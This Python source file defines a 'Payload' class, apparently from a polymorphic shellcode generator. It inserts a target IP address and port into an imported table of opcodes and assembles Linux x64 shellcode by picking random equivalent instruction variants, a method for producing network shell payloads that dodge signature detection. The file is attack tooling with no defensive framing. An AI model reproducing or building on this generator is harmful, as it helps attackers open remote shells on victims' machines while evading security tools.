from opcodes import permut_list
from random import randint
from utils import *

class Payload:
    def __init__(self,platform,port,ip):
        """
        Payload's constructor method from a platform (Windows/Linux), a port and an ip
        """
        self.shellcode = ""
        self.platform = platform
        self.arch = "x64"
        self.port = port
        self.ip = ip

    def __str__(self):
        """
        Return the ToString of the Payload object
        """
        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.ip}\nPort: {self.port} \nShellcode:\n{self.shellcode}"

    def permut(self):
        """
        
        """
        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_hex(self.port)) # Weird trick for the moment to swap the port (to change)
        permut_list[17][0] = permut_list[17][0].replace(r"\x7f\x01\x01\x01", ip_to_hex(self.ip)) # Weird trick for the moment to swap the ip (to change)
        
        if self.platform == "Linux":
            for line in permut_list:
                    self.shellcode += line[randint(0,len(line)-1)]

    def get_bytes_size(self):
        return self.shellcode.count(r"\x")